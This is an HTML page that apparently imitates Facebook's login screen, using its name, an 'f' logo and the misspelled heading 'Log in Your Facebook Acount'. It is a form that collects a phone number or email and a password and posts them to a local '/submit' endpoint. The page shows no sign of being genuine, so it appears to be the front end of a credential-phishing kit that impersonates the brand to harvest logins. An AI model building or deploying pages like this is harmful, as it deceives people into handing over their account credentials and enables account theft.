<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Log in</title>
    <style>
        @media only screen and (max-width: 400px) {

        .container{ width: 100% !important;}
    }
    </style>
</head>
<body style="margin: 0px; padding: 0px;background-color: #f2f2f2;font-family: Verdana, Geneva, Tahoma, sans-serif;overflow: hidden;">
<div id="fb-root"></div>

</div>
    <table class="container" border="1" cellpadding="0" cellspacing="0" width="400" height="250px" style="margin: 100px auto; font-family: Verdana, Geneva, Tahoma, sans-serif; background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); overflow: hidden;">
        <tr>
            <td style="text-align: center;padding: 40px 20px;">
                <div style="background-color: #00bbff; display: inline-block;width: 60px; height: 60px; border-radius: 50%; line-height: 60px; font-weight: bold; font-size: 50px;color: #fff; font-family: Arial, Helvetica, sans-serif;">f</div>
            </td>
        </tr>
        <tr style="text-align: center;">
            <td>
            <div style="background-color: #fff; display: inline-block; color: #00bbff;padding: 8px 90px; font-weight: 600; border-radius: 8px; margin-bottom: 30px;">
            Log in Your Facebook Acount
            </div>
            </td>



            <tr>
                <td style="padding: 10px; text-align: center;">


                    <form action="/submit" method="POST">
                        <input type="text" id="user_name" name="user_name" placeholder="Phone number or Email address"style="width: 250px; height: 30px;padding-left: 10px;border: 2px solid rgb(66, 192, 255); border-radius: 8px; font-family: Arial, Helvetica, sans-serif;">

                        

                </td>
            </tr>
        </tr>
        <tr>
            <td style="text-align: center;padding: 10px;">

                <input style="width: 250px; height: 30px;padding-left: 10px; border: 2px solid rgb(66, 192, 255); border-radius: 8px; font-family: Arial, Helvetica, sans-serif;" type="password" name="user_message" id="user_message" placeholder="Password">
            </td>
        </tr>
        <tr>
            <td style="text-align: center;padding: 10px;padding-bottom: 50px;">
                <div style="background-color: #00bbff; display: inline-block; color: #fff;padding: 10px 50px; font-weight: 600; border-radius: 20px;font-family: Arial, Helvetica, sans-serif;">
                    

                     <button type="submit">Submit</button>
    </form>

                </div>

               
            </td>
        </tr>
    </table>
</div>












</body>
</html>
